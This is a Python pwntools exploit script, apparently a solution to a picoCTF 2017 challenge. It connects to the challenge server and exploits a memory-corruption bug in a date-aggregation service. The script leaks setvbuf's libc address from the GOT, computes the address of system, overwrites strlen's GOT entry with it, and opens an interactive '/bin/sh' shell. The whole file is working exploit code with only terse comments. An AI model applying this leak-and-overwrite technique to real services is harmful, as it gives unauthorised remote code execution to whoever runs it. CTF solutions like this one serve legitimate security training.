#!/usr/bin/env python3

import pwn

rem = pwn.remote('shell2017.picoctf.com', 21986)

# policy: setvbuf -> system

def send_add(date, data):
	rem.sendline(date + ' ' + str(data))

def send_rm(date):
	rem.sendline('~' + date)

def send_agg(cmd, month_year):
	rem.sendline('a' + cmd + ' ' + month_year)
	return int(rem.recvline(keepends = False).decode())

def send_inv(invalid):
	rem.sendline(invalid)
	rem.recvline()

def send_cmt(cmt):
	rem.sendline('#' + cmt)

send_add('04-01-2000', 400)
send_add('05-01-2000', 500)
send_add('06-01-2000', 600)
send_add('07-01-2000', 700)

# put print address onto the got entry of setvbuf
send_cmt('')
send_rm('04-01-2000')
send_rm('05-01-2000')
send_rm('06-01-2000')
send_rm('07-01-2000')

setvbuf_got = 0x601f58
strlen_got = 0x601f00
system_offset = 0x41490
setvbuf_offset = 0x6c0a0

def pwn_line(*data):
	payload = b''
	for d in data:
		payload += d.to_bytes(8, byteorder='little')
	return payload

# get address of setvbuf in libc -> get address of system in libc
payload = pwn_line(setvbuf_got, 1, 16, 1, 0)
send_inv(payload)
setvbuf_libc = send_agg('+', '07-2000')

# calculate address of system
libc_base = setvbuf_libc - setvbuf_offset
system_libc = libc_base + system_offset

# overwrite the got entry of strlen to address of system
payload = pwn_line(strlen_got - 0x8, 1, 16, 1)
send_inv(payload)

#send_add('05-01-2000', 4702111234474983745)
send_add('05-01-2000', system_libc)

rem.sendline('/bin/sh')
rem.interactive()
